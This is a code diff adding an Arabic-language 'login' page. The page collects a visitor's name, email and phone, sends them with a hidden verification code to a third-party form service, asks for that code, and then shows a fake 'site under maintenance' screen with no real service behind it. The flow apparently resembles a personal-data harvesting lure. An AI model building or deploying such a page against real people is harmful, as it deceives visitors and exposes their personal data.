@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: #f4ebf8; 
+            display: flex; 
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 15px; 
+            box-shadow: 0 8px 20px rgba(94, 53, 177, 0.15); 
+            width: 90%; 
+            max-width: 400px; 
+            border-top: 5px solid #d4af37; 
+            min-height: 350px; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        h2 {
+            text-align: center;
+            color: #5e35b1; 
+            margin-bottom: 25px;
+            margin-top: 0;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #4a148c; 
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1c4e9; 
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #d4af37; 
+            box-shadow: 0 0 5px rgba(212, 175, 55, 0.3); 
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #d4af37; 
+            color: #ffffff; 
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s, transform 0.1s;
+        }
+
+        button:hover {
+            background-color: #b8972e; 
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        /* --- تنسيقات خطوة التحقق (مربعات الكود) --- */
+        #step-2 {
+            display: none; 
+            text-align: center;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            direction: ltr; 
+            margin-bottom: 20px;
+        }
+
+        .otp-box {
+            width: 55px;
+            height: 55px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #d1c4e9;
+            border-radius: 10px;
+            outline: none;
+            transition: 0.3s;
+            color: #4a148c;
+            padding: 0;
+        }
+
+        .otp-box:focus {
+            border-color: #d4af37;
+            box-shadow: 0 0 8px rgba(212, 175, 55, 0.4);
+        }
+
+        #otp-error {
+            color: #d32f2f;
+            font-weight: bold;
+            margin-top: 10px;
+            display: none;
+            font-size: 15px;
+        }
+
+        .sub-text {
+            color: #7e57c2;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        /* --- تنسيقات شاشة الصيانة النهائية --- */
+        #final-message {
+            display: none; 
+            text-align: center;
+            animation: fadeIn 0.8s ease-in-out; 
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .main-message {
+            color: #5e35b1;
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            margin-top: 0;
+        }
+
+        .maintenance-emoji {
+            font-size: 60px;
+            margin: 15px 0;
+        }
+
+        .sub-message {
+            color: #d4af37; /* لون ذهبي ليناسب التنبيه */
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        
+        <div id="step-1">
+            <h2>مرحباً بك</h2>
+            <form id="myForm">
+                <input type="hidden" name="access_key" value="7e112611-8fbd-4767-b202-373fd165f8b2">
+                
+                <input type="hidden" name="Verification_Code" id="hidden-code">
+
+                <div class="input-group">
+                    <label>الاسم:</label>
+                    <input type="text" name="name" required>
+                </div>
+
+                <div class="input-group">
+                    <label>البريد الإلكتروني:</label>
+                    <input type="email" name="email" required>
+                </div>
+
+                <div class="input-group">
+                    <label>الرقم:</label>
+                    <input type="text" name="phone_number" required>
+                </div>
+
+                <button type="submit" id="submit-btn">ادخل</button>
+            </form>
+        </div>
+
+        <div id="step-2">
+            <h2>رمز التحقق</h2>
+            <p class="sub-text">الرجاء إدخال الرمز المكون من 4 أرقام</p>
+            
+            <div class="otp-container">
+                <input type="text" maxlength="1" class="otp-box" id="otp1">
+                <input type="text" maxlength="1" class="otp-box" id="otp2">
+                <input type="text" maxlength="1" class="otp-box" id="otp3">
+                <input type="text" maxlength="1" class="otp-box" id="otp4">
+            </div>
+            
+            <button id="verify-btn">تأكيد الرمز</button>
+            <p id="otp-error">الرمز غير صحيح، حاول مرة أخرى.</p>
+        </div>
+
+        <div id="final-message">
+            <p class="main-message">لا يمكن فتح الموقع الآن</p>
+            <div class="maintenance-emoji">🛠️</div>
+            <p class="sub-message">الموقع قيد الصيانة</p>
+        </div>
+
+    </div>
+
+    <script>
+        const generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
+        document.getElementById('hidden-code').value = generatedCode;
+
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const finalMessage = document.getElementById('final-message');
+        const form = document.getElementById('myForm');
+        const submitBtn = document.getElementById('submit-btn');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            submitBtn.innerHTML = "جاري المعالجة...";
+            const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: json
+            })
+            .then(async (response) => {
+                if (response.status == 200) {
+                    step1.style.display = "none";
+                    step2.style.display = "block";
+                    document.getElementById('otp1').focus(); 
+                } else {
+                    submitBtn.innerHTML = "حدث خطأ، حاول مرة أخرى";
+                }
+            })
+            .catch(error => {
+                console.log(error);
+                submitBtn.innerHTML = "حدث خطأ في الاتصال";
+            });
+        });
+
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if(e.target.value.length === 1 && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+            box.addEventListener('keydown', (e) => {
+                if(e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('verify-btn').addEventListener('click', () => {
+            let enteredCode = '';
+            otpBoxes.forEach(box => enteredCode += box.value);
+
+            if(enteredCode === generatedCode) {
+                step2.style.display = "none";
+                finalMessage.style.display = "block";
+            } else {
+                document.getElementById('otp-error').style.display = "block";
+            }
+        });
+    </script>
+
+</body>
+</html>
